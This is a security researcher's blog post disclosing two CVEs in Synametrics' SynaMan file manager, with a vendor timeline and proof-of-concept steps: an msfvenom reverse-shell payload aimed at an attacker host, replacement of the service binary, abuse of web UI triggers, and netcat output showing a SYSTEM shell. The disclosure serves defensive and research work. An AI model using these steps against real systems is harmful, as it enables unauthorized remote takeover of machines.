<!DOCTYPE html>
<html lang="en-us">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.78.2" />

    
    
    

<title>Multiple vulnerabilities in Synametrics&#39; Synaman â¢ Jeffrey Bencteux</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Multiple vulnerabilities in Synametrics&#39; Synaman"/>
<meta name="twitter:description" content="While doing a CTF box, I escalated privileges using an unintended path that led to the below discoveries.
Synametrics definition of Synaman:
&ldquo;SynaMan - A Remote File Manager - Share large files with colleagues without compromising on security.&rdquo; // mark this sentence
CVEs registered  CVE-2022-26250: LPE via weak service permissions CVE-2022-26251: RCE and privilege escalation by using the default web UI administrative features.  Affected versions and platforms Synaman 5."/>

<meta property="og:title" content="Multiple vulnerabilities in Synametrics&#39; Synaman" />
<meta property="og:description" content="While doing a CTF box, I escalated privileges using an unintended path that led to the below discoveries.
Synametrics definition of Synaman:
&ldquo;SynaMan - A Remote File Manager - Share large files with colleagues without compromising on security.&rdquo; // mark this sentence
CVEs registered  CVE-2022-26250: LPE via weak service permissions CVE-2022-26251: RCE and privilege escalation by using the default web UI administrative features.  Affected versions and platforms Synaman 5." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.bencteux.fr/posts/synaman/" />
<meta property="article:published_time" content="2022-04-05T12:00:00+00:00" />
<meta property="article:modified_time" content="2022-04-05T12:00:00+00:00" /><meta property="og:site_name" content="Jeffrey Bencteux" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">









<link rel="stylesheet" href="/scss/hyde-hyde.71157e768c4e111a23c3531b95e0cbb59bbef3c9e6901d36247cb53d6b6be258.css" integrity="sha256-cRV&#43;doxOERojw1MbleDLtZu&#43;88nmkB02JHy1PWtr4lg=">


<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">


<link rel="stylesheet" href="/css/custom.0feaa34a7be8819ce960219f3ff920fb192e09394719a63fa91f5ec21727d8d7.css" integrity="sha256-D&#43;qjSnvogZzpYCGfP/kg&#43;xkuCTlHGaY/qR9ewhcn2Nc=">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    
    <script type="text/javascript">
  var _paq = window._paq = window._paq || [];
   
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//stats.bencteux.fr/";
    _paq.push(['setTrackerUrl', u+'matomo.php']);
    _paq.push(['setSiteId', '1']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
  })();
</script>

</head>


    <body class=" ">
    
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      <span class="site__title">
        <a href="https://www.bencteux.fr/">
        
          Jeffrey Bencteux
        
        </a>
      </span>
      
        
        
        
      <div class="author-image">
	<img src="https://www.bencteux.fr/img/book.jpg" alt="Author Image" class="img--circle img--headshot element--center">
      </div>
        
      
      
      <p class="site__description">
         Rubrique-Ã -brac 
      </p>
    </div>
    <div class="collapsible-menu">
      <input type="checkbox" id="menuToggle">
      <label for="menuToggle">Jeffrey Bencteux</label>
      <div class="menu-content">
        <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/">
						<span>Home</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/about/me/">
						<span>About</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/categories/hacking/">
						<span>Hacking</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/categories/books">
						<span>Library</span>
					</a>
				</li>
			 
		
	</ul>
</div>

        <section class="social">
	
	<a href="https://twitter.com/jeffbencteux" rel="me"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	<a href="https://github.com/jeffbencteux" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	<a href="https://linkedin.com/in/jeffrey-bencteux-6ba59a89" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://stackoverflow.com/users/3452702/jeff-bencteux" rel="me"><i class="fab fa-stack-overflow fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	
	
	
	
</section>

	<p align="center"><iframe width='160' height='450' src='https://leanpub.com/emailsecattackanddefence/embed' frameborder='0' allowtransparency='true'></iframe></p>
      </div>
    </div>
    
<div class="copyright">
  &copy; 2019 - 2024 Jeffrey Bencteux
  
</div>


<div class="builtwith">
Built with <a href="https://gohugo.io">Hugo</a> â¤ï¸ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
</div>


  </div>
</div>

        <div class="content container">
            
    
<article>
  <header>
    <h1>Multiple vulnerabilities in Synametrics&#39; Synaman</h1>
    
    
<div class="post__meta">
    
    
      <i class="fas fa-calendar-alt"></i> Apr 05, 2022
    
    
    
      
      
          in
          
          
              <a class="badge badge-category" href="/categories/hacking">HACKING</a>
              â¢
          
              <a class="badge badge-category" href="/categories/vulnerabilities">VULNERABILITIES</a>
              
          
      
    
    
    
      
      
          <br/>
           <i class="fas fa-tags"></i>
          
          <a class="badge badge-tag" href="/tags/synaman">synaman</a>
           
      
          <a class="badge badge-tag" href="/tags/synametrics">synametrics</a>
          
      
    
    
    <br/>
    <i class="fas fa-clock"></i> 4 min read
</div>


  </header>
  
  
  <div class="post">
    <p>While doing a CTF box, I escalated privileges using an unintended path that led to the below discoveries.</p>
<p>Synametrics definition of Synaman:</p>
<p>&ldquo;<a href="https://web.synametrics.com/SynaMan.htm">SynaMan</a> - A Remote File Manager - Share large files with colleagues without compromising on security.&rdquo; // mark this sentence</p>
<p><img src="/img/synaman/synaman1.png" alt="Synaman"></p>
<h1 id="cves-registered">CVEs registered</h1>
<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26250">CVE-2022-26250</a>: LPE via weak service permissions</li>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26251">CVE-2022-26251</a>: RCE and privilege escalation by using the default web UI administrative features.</li>
</ul>
<h2 id="affected-versions-and-platforms">Affected versions and platforms</h2>
<p>Synaman 5.0 and below. Partial fix on Synaman 5.1.</p>
<h1 id="fixed-versions">Fixed versions</h1>
<p>Version 5.1 fixes CVE-2022-26250. Note that even users that got 5.1 when it came out have to update as there was several fixes made by vendor on the same version number.</p>
<p>Version 5.1 claims to fix CVE-2022-26250 but it does not.</p>
<h1 id="timeline">Timeline</h1>
<ul>
<li>05/01/2022: Initial mail to vendor and immediate response asking for precisions</li>
<li>08/01/2022: Bumping vendor to know if they will fix</li>
<li>10/01/2022: vendor says they are working on a fix</li>
<li>08/02/2022: vendor silently release a new version</li>
<li>11/02/2022: asking vendor if that version fixes the issues, reply is yes</li>
<li>21/02/2022: testing and contacting vendor stating released version does not fix vulnerabilities</li>
<li>23/03/2022: CVE assigned, bumping vendor to know if they will fix</li>
<li>24/03/2022: vendor states he thinks it is fixed. Tests show that it is not and recommendation is sent to vendor</li>
<li>01/04/2022: vendor fixes CVE-2022-26250</li>
<li>05/04/2022: public disclosure</li>
</ul>
<h1 id="cve-2022-26250-local-privilege-escalation-via-weak-service-permissions">CVE-2022-26250: Local Privilege Escalation via weak service permissions</h1>
<p>Synaman is installed by default in &ldquo;C:\Synaman&rdquo; with weak folder permissions granting any user write permission to the contents of the directory and its sub-folders. In addition, the program installs a service called &ldquo;SynaMan&rdquo; which runs as &ldquo;LocalSystem&rdquo;, this will allow any local user to escalate privileges to &ldquo;NT AUTHORITY\SYSTEM&rdquo; by substituting the service&rsquo;s binary with a malicious one.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>In the below, attacker machine is 192.168.0.11 and Synaman server is 192.168.0.10.</p>
<p>Querying the service configuration:</p>
<pre><code>PS C:\&gt; sc.exe qc SynaMan
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SynaMan
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\SynaMan\SynaMan.exe //RS//SynaMan
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : SynaMan
        DEPENDENCIES       : Tcpip
                           : Afd
        SERVICE_START_NAME : LocalSystem
</code></pre><p>And checking the permissions associated with the binary:</p>
<pre><code>PS C:\&gt; icacls  C:\SynaMan\SynaMan.exe
C:\SynaMan\SynaMan.exe NT AUTHORITY\SYSTEM:(I)(F)
                       BUILTIN\Administrators:(I)(F)
                       NT AUTHORITY\Authenticated Users:(I)(RX)
                       BUILTIN\Users:(I)(RX)
                       NT AUTHORITY\Authenticated Users:(I)(M)

Successfully processed 1 files; Failed processing 0 files
</code></pre><p>We see that &ldquo;NT AUTHORITY\Authenticated Users&rdquo; can modify the file.</p>
<p>By generating a reverse shell payload:</p>
<pre><code>msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=192.168.0.11 LPORT=8080 -f exe -o r8080.exe
</code></pre><p>Uploading it on the target and replacing the SynaMan.exe binary:</p>
<pre><code>move C:\SynaMan\SynaMan.exe C:\SynaMan\SynaMan.exe.bak
move C:\SynaMan\r8080.exe C:\SynaMan\SynaMan.exe
</code></pre><p>And restarting the machine:</p>
<pre><code>shutdown /r
</code></pre><p>It is possible to obtain a reverse shell with &ldquo;nt authority\system&rdquo; privileges when the host reboots:</p>
<pre><code>ââ$ nc -nvlp 8080                                                                                                                                                                                                                        1 â¨¯
listening on [any] 8080 ...
connect to [192.168.0.11] from (UNKNOWN) [192.168.0.10] 49669
Microsoft Windows [Version 10.0.19042.1348]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32&gt;whoami
whoami
nt authority\system
</code></pre><p>Note that this was initially found on version 5.0. Version 5.1 now installs the software in Program Files.</p>
<h1 id="cve-2022-26251-rce-and-privilege-escalation-via-web-ui">CVE-2022-26251: RCE and privilege escalation via web UI</h1>
<p>The software has a web UI that can be reached by other hosts on port 6060:</p>
<p><img src="/img/synaman/login.png" alt="login"></p>
<p>An authenticated administrator can create read/write shares in arbitrary locations on the server where arbitrary files can be uploaded. He can also create &ldquo;triggers&rdquo; that allow an arbitrary executable to be run. Combinaison of these features allow for remote code execution. The SynaMan.exe binary is run as the SYSTEM user by default, actions are performed as this privileged user leading to privilege escalation.</p>
<p>So an attacker can go from administrator on the web UI to SYSTEM on the web server. Note that all these actions are there by design in this software. The vulnerability consists in using it with malicious intent.</p>
<h2 id="proof-of-concept-1">Proof of Concept</h2>
<p>Create a new share on page &ldquo;Manage Folders&rdquo;: http://host:6060/app?operation=mngFolders</p>
<ul>
<li>Check &ldquo;Public read&rdquo;</li>
<li>Check &ldquo;Public write&rdquo;</li>
</ul>
<p><img src="/img/synaman/share_creation.png" alt="Share creation"></p>
<p>Create a malicious binary, for example a reverse shell payload:</p>
<pre><code>msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=&lt;attacker_host&gt; LPORT=8080 -f exe -o r8080.exe
</code></pre><ul>
<li>Open a reverse shell on the attacker machine:</li>
</ul>
<pre><code>nc -nvlp 8080
</code></pre><p>Go to &ldquo;Explore&rdquo; and upload the binary on the previously created share: http://host:6060/app?operation=explore</p>
<p><img src="/img/synaman/upload_revshell_on_share.png" alt="Upload to share"></p>
<p>Create a new trigger on page &ldquo;Configuration&rdquo; &gt; &ldquo;Triggers&rdquo;: http://host:6060/app?operation=triggers</p>
<ul>
<li>set &ldquo;Executable path&rdquo; with the path of your share followed by the uploaded binary</li>
<li>set &ldquo;Event Type&rdquo; to whatever you want (e.g.: &ldquo;File uploaded&rdquo;)</li>
</ul>
<p><img src="/img/synaman/trigger.png" alt="trigger"></p>
<p>Provoke the trigger through the corresponding event (e.g. upload a test.txt file).</p>
<p><img src="/img/synaman/upload.png" alt="Upload to trigger"></p>
<p>A prompt should appear on the listening netcat:</p>
<pre><code>ââ$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.0.11] from (UNKNOWN) [192.168.0.10] 51070
Microsoft Windows [Version 10.0.19042.1348]
(c) Microsoft Corporation. All rights reserved.

C:\SynaMan&gt;whoami
whoami
nt authority\system
</code></pre><p>Note that this was initially found on version 5.0.</p>
<p>In version 5.1, vendor put a checkbox for restricting the administrator access to localhost but it is not checked by default, users are likely to not check it and click to continue installation. Even when installing with the checkbox checked, I still had remote access to the web interface with the admin user on another host:</p>
<p><img src="/img/synaman/restrict_localhost.png" alt="Restrict to localhost"></p>

  </div>
  

<div class="navigation navigation-single">
    
    <a href="/posts/ewptx/" class="navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">ElearnSecurity Web application Penetration Tester eXtreme (eWPTXv2) review</span>
    </a>
    
    
    <a href="/posts/crto/" class="navigation-next">
      <span class="navigation-tittle">Zero-point Security&#39;s Red Team Ops (CRTO) review</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  




  
    


</article>


        </div>
        
    

<script defer src="https://use.fontawesome.com/releases/v5.12.1/js/all.js" integrity="sha384-ZbbbT1gw3joYkKRqh0kWyRp32UAvdqkpbLedQJSlnI8iLQcFVxaGyrOgOJiDQTTR" crossorigin="anonymous"></script>


    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
        
    <script type="text/javascript">
        
        hljs.initHighlightingOnLoad();
    </script>
    



    



    </body>
</html>
